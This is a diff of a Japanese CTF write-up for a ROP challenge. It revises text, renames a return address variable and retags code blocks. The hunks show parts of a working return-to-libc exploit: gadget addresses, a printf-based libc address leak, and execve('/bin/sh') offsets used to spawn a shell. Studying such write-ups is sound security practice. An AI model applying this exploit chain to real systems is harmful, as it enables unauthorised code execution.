@@ -10,7 +10,7 @@ libcもくっついているのがBaby ROPとの違い。
 Harekaze CTF終了した2時間後に解けた。
 GOTを追う場所を間違えた。
 無念．．．
-`printf("%s")`でアドレスリークができると言うのを実践できたのは収穫。
+`printf("%s")`でアドレリークができると言うのを実践できたのは収穫。
 
 ## 解法
 
@@ -190,7 +190,7 @@ addr_libc_start_main = 0x0000000000020740
 addr_libc_execve = 0x00000000000cc770
 addr_libc_binsh = 0x18cd57
 addr_start_main_got = 0x601028
-addr_main = 0x400540
+addr_start = 0x400540
 addr_printf_plt = 0x00000000004004f0
 addr_welcome = 0x400770
 
@@ -204,7 +204,7 @@ s += pwn.p64(rop_pop_rsi)
 s += pwn.p64(addr_start_main_got)
 s += pwn.p64(0x0)
 s += pwn.p64(addr_printf_plt)
-s += pwn.p64(addr_main)
+s += pwn.p64(addr_start)
 
 io.sendline(s)
 buf = io.recvline()
@@ -263,7 +263,7 @@ Gadgets information
 0x0000000000400731 : pop rsi ; pop r15 ; ret
 ```
 
-```plain
+```python
 rop_pop_rdi = 0x0000000000400733
 rop_pop_rsi = 0x0000000000400731
 ```
@@ -327,12 +327,12 @@ $
 addr_printf_plt = 0x00000000004004f0
 ```
 
-### addr_main
+### addr_start
 
-1回目のオーバーフローで実行したROPが終わったらもう一度mainの最初に戻すたえに使う。
+1回目のオーバーフローで実行したROPが終わったらもう一度プログラムの最初に戻すために使う。
 
 ```python
-addr_main = 0x400540
+addr_start = 0x400540
 ```
 
 ### addr_libc_start_main
@@ -346,13 +346,13 @@ $ objdump -d libc.so.6 | grep start_main
 0000000000020740 <__libc_start_main@@GLIBC_2.2.5>:
 ```
 
-```plain
+```python
 addr_libc_start_main = 0x0000000000020740
 ```
 
 ### addr_libc_execve、
 execveのlibc上でのアドレス。
-このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスaddr_execveが分かるのでexecve("/bin/sh")ができる。
+このアドレスとlibcがロードされているアドレスを足せばexecveがロードされているアドレスaddr_execveが分かるのでexecve("/bin/sh")が実行できる。
 
 調べ方は`objdump -d libc.so.6`して出てきたコード上のアドレスを探すだけ。
 
@@ -363,7 +363,7 @@ $ objdump -d libc.so.6 | grep execve
 00000000000cc770 <execve@@GLIBC_2.2.5>:
 ```
 
-```plain
+```python
 addr_libc_start_main = 0x0000000000020740
 addr_libc_execve = 0x00000000000cc770
 ```
@@ -382,7 +382,7 @@ $ strings -t x libc.so.6 | grep "/bin/sh"
 $
 ```
 
-```plain
+```python
 addr_libc_binsh = 0x18cd57
 ```
 
